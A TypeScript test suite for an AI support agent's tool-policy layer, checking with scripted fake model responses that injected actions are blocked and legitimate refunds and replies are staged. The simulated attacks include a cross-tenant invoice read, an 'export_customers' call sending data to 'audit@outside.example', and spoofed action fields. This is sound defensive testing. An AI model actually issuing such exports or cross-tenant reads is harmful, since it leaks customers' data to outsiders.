import assert from "node:assert/strict";
import test from "node:test";
import { buildSupportPlan, replayProposals } from "../lib/support/agent";
import { runLiveAgent } from "../lib/support/live-agent";
import { supportInvoices, supportTickets } from "../lib/support/fixtures";
import { evaluateSupportActions, verifyPlan } from "../lib/support/policy";
import type { PlanRequest } from "../lib/support/types";

const ticket = supportTickets[0];
const invoice = supportInvoices[0];
const request: PlanRequest = { ticketId: ticket.id, mode: "live", scenario: "normal", profile: "standard" };
const call = (name: string, args: unknown, id = name) => ({ type: "function_call", name, arguments: JSON.stringify(args), call_id: id });
const message = { type: "message", content: [{ type: "output_text", text: "Invoice correction and reply staged for review." }] };
function provider(outputs: unknown[][]) {
  const bodies: Record<string, unknown>[] = [];
  const fake = (async (url: string | URL | Request, init?: RequestInit) => {
    assert.equal(url, "https://api.openai.com/v1/responses");
    bodies.push(JSON.parse(String(init?.body)) as Record<string, unknown>);
    const output = outputs.shift();
    if (!output) throw new Error("Unexpected model iteration");
    return Response.json({ output, status: "completed" });
  }) as typeof fetch;
  return { fake, bodies };
}

test("live tool loop denies injected reads/exports and stages the legitimate task without side effects", async () => {
  const before = structuredClone(invoice);
  const { fake, bodies } = provider([
    [call("read_invoice", { invoiceId: "inv-other-tenant" }, "read-denied")],
    [call("read_invoice", { invoiceId: invoice.id }, "read-permitted")],
    [call("export_customers", { tenantId: ticket.tenantId, destination: "audit@outside.example" })],
    [call("propose_refund", { invoiceId: invoice.id, amountCents: 2500 })],
    [call("propose_reply", { to: ticket.customerEmail, subject: "Invoice review", body: "Your credit is staged for review." })],
    [message],
  ]);
  const result = await runLiveAgent(ticket, invoice, request, { apiKey: "synthetic-test-token", model: "test-model" }, fake);
  assert.deepEqual(invoice, before);
  assert.deepEqual(result.trace.map((t) => t.decision), ["block", "allow", "block", "allow", "allow"]);
  const evaluated = evaluateSupportActions(ticket, invoice, result.actions, "standard");
  assert.deepEqual(evaluated.actions.map((a) => a.decision), ["block", "allow", "allow"]);
  assert.equal(evaluated.invoiceAfter.refundedCents, 2500);
  const subsequentInput = bodies[1].input as Array<{ type: string; output?: string }>;
  assert.ok(subsequentInput.some((item) => item.type === "function_call_output" && item.output?.includes('"decision":"block"')));
  assert.ok(bodies.every((body) => body.store === false && body.parallel_tool_calls === false));
});

test("live adapter refuses a wrong invoice even when its tenant and customer match", async () => {
  const { fake } = provider([[call("read_invoice", { invoiceId: ticket.invoiceId })], [call("propose_reply", { to: ticket.customerEmail, subject: "Review", body: "Staged reply." })], [message]]);
  const result = await runLiveAgent(ticket, { ...invoice, id: "different-invoice" }, request, { apiKey: "synthetic", model: "test" }, fake);
  assert.equal(result.trace[0].decision, "block");
});

test("live adapter reports malformed calls but does not dispatch their effects", async () => {
  const { fake } = provider([[call("propose_refund", { invoiceId: invoice.id, amountCents: -5 })], [call("propose_reply", { to: ticket.customerEmail, subject: "Review", body: "Staged reply." })], [message]]);
  const result = await runLiveAgent(ticket, invoice, request, { apiKey: "synthetic", model: "test" }, fake);
  assert.equal(result.trace[0].decision, "block");
  assert.equal(result.actions.length, 1);
  assert.equal(result.actions[0].type, "send_reply");
});

test("strict live tool results preserve pending approval instead of claiming execution", async () => {
  const { fake, bodies } = provider([[call("propose_refund", { invoiceId: invoice.id, amountCents: 2500 })], [message]]);
  const result = await runLiveAgent(ticket, invoice, { ...request, profile: "strict" }, { apiKey: "synthetic", model: "test" }, fake);
  assert.equal(result.trace[0].decision, "approval_required");
  assert.ok(JSON.stringify(bodies[1].input).includes("executed\\\":false"));
});

test("provider failure is sanitized and never exposes response bodies or credentials", async () => {
  const fake = (async () => new Response("provider secret details", { status: 401 })) as typeof fetch;
  await assert.rejects(runLiveAgent(ticket, invoice, request, { apiKey: "synthetic", model: "test" }, fake), (e: unknown) => e instanceof Error && e.message.includes("401") && !e.message.includes("secret"));
});

test("a model that keeps calling tools is stopped at the iteration budget", async () => {
  const { fake } = provider(Array.from({ length: 8 }, (_, i) => [call("read_invoice", { invoiceId: invoice.id }, `read-${i}`)]));
  await assert.rejects(runLiveAgent(ticket, invoice, request, { apiKey: "synthetic", model: "test" }, fake), /iteration budget/);
});

test("model tool arguments cannot supply trusted action identity, type, or redaction state", async () => {
  for (const extra of [{ id: "attacker" }, { type: "refund" }, { redacted: true }]) {
    const { fake } = provider([[call("propose_refund", { invoiceId: invoice.id, amountCents: 2500, ...extra })], [call("propose_reply", { to: ticket.customerEmail, subject: "Review", body: "Staged reply." })], [message]]);
    const result = await runLiveAgent(ticket, invoice, request, { apiKey: "synthetic", model: "test" }, fake);
    assert.equal(result.trace[0].decision, "block");
    assert.ok(result.actions.every((action) => action.type !== "refund"));
  }
});

test("replay scenarios block attack effects and keep authorized support steps", async () => {
  for (const scenario of ["injection", "over-refund", "cross-tenant", "duplicate-refund"] as const) {
    const plan = await buildSupportPlan(ticket, invoice, { ...request, mode: "replay", scenario }, { model: "test" });
    assert.ok(plan.actions.some((a) => a.decision === "block"));
    assert.ok(plan.actions.some((a) => a.action.type === "send_reply" && a.decision === "allow"));
    assert.ok(await verifyPlan(plan));
  }
});

test("replay does not repeat an already applied refund, and unavailable live mode never silently becomes replay", async () => {
  const result = replayProposals(ticket, { ...invoice, refundedCents: 2500, status: "resolved" }, { ...request, mode: "replay" });
  assert.ok(result.actions.every((a) => a.type !== "refund"));
  await assert.rejects(buildSupportPlan(ticket, invoice, request, { model: "test" }), /Live agent unavailable/);
});
